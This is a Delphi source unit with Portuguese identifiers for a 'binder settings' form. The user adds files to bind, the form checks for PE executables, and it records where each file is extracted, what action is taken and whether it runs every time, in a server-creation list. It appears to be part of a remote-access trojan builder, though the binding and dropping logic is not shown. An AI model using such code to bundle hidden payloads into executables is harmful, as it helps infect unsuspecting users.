unit UnitBinderSettings;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ImgList, Buttons, StdCtrls, ComCtrls, Menus, CommCtrl, IconChanger, UnitMudarIcone,
  ExtCtrls, sPanel, unitMain;

type
  TFormBinderSettings = class(TForm)
    MainPanel: TsPanel;
    Label6: TLabel;
    SpeedButton1: TSpeedButton;
    SpeedButton2: TSpeedButton;
    ListView1: TListView;
    ImageList16: TImageList;
    ImageList32: TImageList;
    PopupMenu1: TPopupMenu;
    Adicionararquivos1: TMenuItem;
    Excluirarquivos1: TMenuItem;
    ImageList1: TImageList;
    OpenDialog1: TOpenDialog;
    procedure FormCreate(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure ListView1SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure FormShow(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure Adicionararquivos1Click(Sender: TObject);
    procedure Excluirarquivos1Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
  private
    { Private declarations }
    MasterHIMAGELIST: HIMAGELIST;
	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
  public
    { Public declarations }
    Procedure AtualizarIdiomas;
  end;

function CheckValidPE(filename: string): boolean;

type
  TBinderData = Class
    Filename: Array[0..260] of WideChar;
    FileSize: int64;
    ExtractTo: integer;
    Action: integer;
    ExecuteAllTime: boolean;
    FileBuffer: WideString;
  end;

var
  FormBinderSettings: TFormBinderSettings;

implementation

{$R *.dfm}

uses
  UnitStrings,
  UnitConstantes,
  UnitBinderSelect,
  ShellAPI,
  AS_ShellUtils,
  UnitCreateServer;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormBinderSettings.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdiomas;
end;  

function GetFileSize(fname: string): int64;
var
  myfile: TFileStream;
begin
  result := 0;
  if FileExists(fname) = false then exit;
  myFile := TFileStream.Create(fname, fmOpenRead + fmShareDenyNone);
  try
    result := myFile.Size;
    finally
    myFile.free;
  end;
end;

function CheckValidPE(filename: string): boolean;
var
  MyFile   : THandle;
  hmapping : THandle;
  pmapping : Pointer;
  pdosh    : PImageDosHeader;
  peh      : PImageNtHeaders;
begin
  result := false;
  MyFile := CreateFile(pchar(filename), GENERIC_READ, FILE_SHARE_READ, nil,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  if MyFile <> INVALID_HANDLE_VALUE then
  begin
    hmapping := CreateFileMapping(MyFile, nil, PAGE_READONLY, 0, 0, nil);
    pmapping := MapViewOfFile(hMapping, FILE_MAP_READ,0 , 0, 0);
    pdosh := PImageDosHeader(pmapping);
    peh:= PImageNtHeaders(Longword(pdosh) + Longword(pdosh._lfanew));
    if (pdosh.e_magic = IMAGE_DOS_SIGNATURE) and (peh.Signature = IMAGE_NT_SIGNATURE) then
      result := True else result := false;
    UnMapViewofFile(pmapping);
    CloseHandle(hmapping);
  end;
  CloseHandle(MyFile);
end;

procedure TFormBinderSettings.Adicionararquivos1Click(Sender: TObject);
begin
  SpeedButton1.Click;
end;

procedure TFormBinderSettings.AtualizarIdiomas;
begin
  ListView1.Column[0].Caption := Traduzidos[77];
  ListView1.Column[1].Caption := Traduzidos[78];
  ListView1.Column[2].Caption := Traduzidos[79];
  ListView1.Column[3].Caption := Traduzidos[80];
  SpeedButton1.Hint := Traduzidos[81];
  SpeedButton2.Hint := Traduzidos[82];
  Adicionararquivos1.Caption := SpeedButton1.Hint;
  Excluirarquivos1.Caption := SpeedButton2.Hint;
  Label6.Caption := Traduzidos[83];
end;

procedure TFormBinderSettings.Excluirarquivos1Click(Sender: TObject);
begin
  SpeedButton2.Click;
end;

procedure TFormBinderSettings.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  ImageList32.GetBitmap(0, SpeedButton1.Glyph);
  ImageList32.GetBitmap(1, SpeedButton2.Glyph);
  MasterHIMAGELIST := GetSystemImageListHandle(False);
  ImageList16.Handle := MasterHIMAGELIST;
  ListView_SetImageList(ListView1.Handle, MasterHIMAGELIST, LVSIL_SMALL);
end;

procedure TFormBinderSettings.FormShow(Sender: TObject);
begin
  AtualizarIdiomas;
  ListView1.Items.Clear;
  FormcreateServer.BinderList.Clear;
  SpeedButton2.Visible := False;
end;

procedure TFormBinderSettings.ListView1SelectItem(Sender: TObject;
  Item: TListItem; Selected: Boolean);
begin
  SpeedButton2.Visible := ListView1.Selected <> nil;
end;

procedure TFormBinderSettings.PopupMenu1Popup(Sender: TObject);
begin
  Excluirarquivos1.Enabled := ListView1.Selected <> nil;
end;

procedure TFormBinderSettings.SpeedButton1Click(Sender: TObject);
var
  FileName: string;
  Item: TListItem;
  SHFileInfo :TSHFileINfo;
  FormBinderSelect: TFormBinderSelect;
  s: string;
  Size: int64;
  BinderData: TBinderData;
  MS: TMemoryStream;
begin
  OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  OpenDialog1.InitialDir := ExtractFilePath(ParamStr(0));
  OpenDialog1.FileName := '';
  OpenDialog1.Filter := 'All files (*.*)|*.*';

  if Opendialog1.Execute = false then exit;

  FormBinderSelect := TFormBinderSelect.create(application);
  try
	FormBinderSelect.Caption := traduzidos[108];
    FormBinderSelect.RadioGroup1.Caption := Traduzidos[116] + ': ';
    FormBinderSelect.RadioGroup2.Caption := Traduzidos[109] + ': ';
    FormBinderSelect.RadioGroup3.Caption := Traduzidos[112] + ': ';
    FormBinderSelect.RadioGroup1.Items.Strings[0] := Traduzidos[59];
    FormBinderSelect.RadioGroup1.Items.Strings[1] := Traduzidos[60];
    FormBinderSelect.RadioGroup1.Items.Strings[2] := Traduzidos[61];
    FormBinderSelect.RadioGroup1.Items.Strings[3] := Traduzidos[64];
    FormBinderSelect.RadioGroup1.Items.Strings[4] := Traduzidos[62];
    FormBinderSelect.RadioGroup1.Items.Strings[4] := Traduzidos[62];
    FormBinderSelect.RadioGroup2.Items.Strings[0] := Traduzidos[110];
    FormBinderSelect.RadioGroup2.Items.Strings[1] := Traduzidos[111];
    FormBinderSelect.RadioGroup3.Items.Strings[0] := Traduzidos[113];
    FormBinderSelect.RadioGroup3.Items.Strings[1] := Traduzidos[114];
    FormBinderSelect.RadioGroup3.Items.Strings[2] := Traduzidos[115];
    FormBinderSelect.BitBtn2.Caption := Traduzidos[120];

    if FormBinderSelect.ShowModal = mrOK then
    begin
      FileName := OpenDialog1.FileName;
      Randomize;
	    s := IntToStr(Random(999)) + ExtractFileName(FileName);
      Size := GetFileSize(FileName);
      if Size > 10000000 then
      begin
        MessageBox(Handle, pChar(Traduzidos[118]), pchar(NomedoPrograma + ' ' + VersaoDoPrograma), MB_ICONWARNING);
      end else
      if Size = 0 then
      begin
        MessageBox(Handle, pChar(Traduzidos[119]), pchar(NomedoPrograma + ' ' + VersaoDoPrograma), MB_ICONWARNING);
      end else
      begin
        BinderData := TBinderData.Create;
        CopyMemory(@BinderData.Filename[0], @s[1], Length(s) * 2);
        BinderData.FileSize := Size;
        BinderData.ExtractTo := FormBinderSelect.RadioGroup1.ItemIndex;
        BinderData.Action := FormBinderSelect.RadioGroup3.ItemIndex;
        BinderData.ExecuteAllTime := FormBinderSelect.RadioGroup2.ItemIndex = 1;

        MS := TMemoryStream.create;
        MS.LoadFromFile(FileName);
        MS.Position := 0;
        SetLength(BinderData.FileBuffer, MS.Size div 2);
        MS.Read(BinderData.FileBuffer[1], MS.Size);
        MS.free;

        Item := ListView1.Items.Add;

        //Item.data := TObject(BinderData);
        FormCreateServer.BinderList.AddObject('', TObject(Binderdata));

        Item.Caption := ExtractFileName(FileName);
        Item.SubItems.Add(FormBinderSelect.RadioGroup1.Items.Strings[FormBinderSelect.RadioGroup1.ItemIndex]);
        Item.SubItems.Add(FormBinderSelect.RadioGroup3.Items.Strings[FormBinderSelect.RadioGroup3.ItemIndex]);
        Item.SubItems.Add(FormBinderSelect.RadioGroup2.Items.Strings[FormBinderSelect.RadioGroup2.ItemIndex]);
        SHGetFileInfo(PChar(FileName), FILE_ATTRIBUTE_NORMAL, SHFileInfo, SizeOf(SHFileInfo), SHGFI_ICON or SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES );
        Item.ImageIndex := SHFileInfo.iIcon;
      end;
    end;
    finally
    FormBinderSelect.Release;
    FormBinderSelect := nil;
  end;

end;


procedure TFormBinderSettings.SpeedButton2Click(Sender: TObject);
var
  i: integer;
begin
  if ListView1.Selected = nil then Exit;
  for i := ListView1.Items.Count - 1 downto 0 do
  if ListView1.Items.Item[i].Selected then ListView1.Items.Item[i].Delete;
end;

end.
